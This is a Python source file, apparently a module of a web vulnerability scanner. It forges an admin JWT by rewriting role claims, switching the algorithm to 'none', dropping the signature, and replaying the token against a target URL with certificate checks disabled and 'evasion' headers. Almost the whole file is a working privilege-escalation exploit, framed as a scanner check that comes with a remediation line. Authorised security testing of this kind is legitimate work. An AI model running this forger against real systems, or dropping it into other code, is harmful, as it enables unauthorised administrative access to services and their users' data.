import aiohttp
import asyncio
import json
import base64

def b64_decode(data):
    # Add padding
    padding = '=' * (4 - (len(data) % 4))
    return base64.urlsafe_b64decode(data + padding).decode('utf-8')

def b64_encode(data):
    return base64.urlsafe_b64encode(data.encode('utf-8')).decode('utf-8').rstrip('=')

async def exploit_jwt_forge(url, param=None, log_callback=None, headers=None, proxy=None):
    """
    Attempts to forge an Admin JWT by manipulating the payload and using 'None' alg.
    Passes 'param' as the JWT token string itself if available, or extracts from headers?
    Assume 'param' is the Token string found in finding detail or we need to pass headers.
    Actually, difficult to do without full request context. 
    We will assume 'param' holds the JWT token if possible.
    """
    findings = []
    token = param
    
    # Evasion Headers
    final_headers = headers.copy() if headers else {}
    
    if not token or len(token.split('.')) != 3:
        return []
        
    try:
        header_b64, payload_b64, sig_b64 = token.split('.')
        
        # 1. Decode Payload
        try:
            payload = json.loads(b64_decode(payload_b64))
        except: return []
        
        # 2. Modify Role
        has_changes = False
        for key in ['role', 'admin', 'is_admin', 'user_type', 'group']:
            if key in payload:
                if payload[key] != 'admin':
                    payload[key] = 'admin'
                    has_changes = True
                    # or 'true' for boolean
        
        if not 'admin' in payload and not 'role' in payload:
             payload['role'] = 'admin' # Just try adding it
             has_changes = True
             
        if not has_changes:
            return []
            
        # 3. Forge with None Alg
        # Header: {"alg": "none", "typ": "JWT"}
        fake_header = b64_encode('{"alg": "none", "typ": "JWT"}')
        fake_payload = b64_encode(json.dumps(payload))
        
        # None alg often requires empty signature or no dot? RFC says dot + empty
        forged_token = f"{fake_header}.{fake_payload}." 
        
        # 4. Global Replay?
        # Requires re-sending a request to the URL with this new token in Authorization header.
        # Check if 403 becomes 200.
        
        if log_callback: log_callback(f"   üõ°Ô∏è JWT Forger: Attempting 'None' alg execution...")
        
        # Merge Auth header with Evasion headers
        exploit_headers = final_headers.copy()
        exploit_headers["Authorization"] = f"Bearer {forged_token}"
        
        async with aiohttp.ClientSession(headers=exploit_headers) as session:
             try:
                 async with session.get(url, timeout=5, ssl=False) as resp:
                     if resp.status == 200:
                         # We need to verify if we actually got admin access.
                         text = await resp.text()
                         if "admin" in text.lower() or "dashboard" in text.lower():
                             findings.append({
                                "type": "Privilege Escalation (JWT None Alg)",
                                "severity": "Critical",
                                "detail": "Successfully accessed resource with forged Admin token (None Alg).",
                                "evidence": f"Forged Token: {forged_token}\nResponse Status: 200 OK",
                                "remediation": "Reject tokens with 'none' algorithm."
                            })
             except: pass

    except: pass
    
    return findings
